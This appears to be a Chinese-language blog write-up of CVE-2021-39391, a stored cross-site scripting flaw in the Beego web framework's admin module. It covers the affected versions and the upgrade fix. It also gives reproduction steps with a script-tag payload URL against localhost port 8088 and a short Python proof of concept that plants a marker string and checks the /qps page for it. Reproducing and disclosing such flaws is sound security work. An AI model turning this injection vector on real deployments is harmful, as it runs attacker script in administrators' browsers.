CVE-2021-39391 Beego跨站脚本漏洞(存储型)
2021-11-29 15:20:14

漏洞描述

Beego是一款基于Go语言的开源Web框架。

Beego 2.0.1存在跨站脚本漏洞，该漏洞源于WEB应用缺少对客户端数据的正确验证。攻击者可利用该漏洞执行客户端代码。

影响版本

Beego 2.0.2(不包含)以下

参考来源

https://github.com/beego/beego/issues/4727

解决办法

升级beego对应的版本

复现过程

1. 安装go环境

  * 对于不熟悉的go的小伙伴来说，重点是要搞清楚GoRoot和GoPath的关系，已踩坑
  * GOROOT是go工具命令行的路径，我这里是/usr/local/go/bin，GOPATH是开发go工程的目录(我自己理解的和python的虚拟环境类似)，我设置的是Users/apple/newGo
  * 官网下载安装即可 ~~~~https://go.dev/

2. 安装bee工具和beego框架

  * 可以参考 https://www.topgoer.com/beego框架/beego安装 这个里面关于go的学习也讲的很好，重点理解：&和*的关系
    ，interface{}
  * 安装有坑可以私信问我

3. 修改项目配置文件

  * 配置文件路径 /GOPATH/src/project_name/conf/app.conf
  * 增加配置项如下
EnableAdmin = true
AdminAddr = "localhost"
AdminPort = 8088

  * 启动成功后的页面

4. 发送存储xss请求，复现成功

  * 直接在页面输入, 会返回404
    http://localhost:8088/<script>alert("beego newbee!")</script>
  * 访问Request Statistics模块即可成功，后面每次访问都会使xss生效
    http://localhost:8088/qps

POC

#! /usr/bin/env python3
# _*_  coding:utf-8 _*_
import requests


flag = "flag xss"
host = "http://localhost"
port = 8088


def audit():
    res = requests.get("{}:{}/</textarea>--> {} <!--<textarea>".format(host, port, flag))
    if res.status_code != 404:
        return

    target_url = "{}:{}/{}".format(host, port, "qps")
    res = requests.get(target_url)
    if res.status_code == 200 and "flag" in res.text:
        return True

    return


audit()
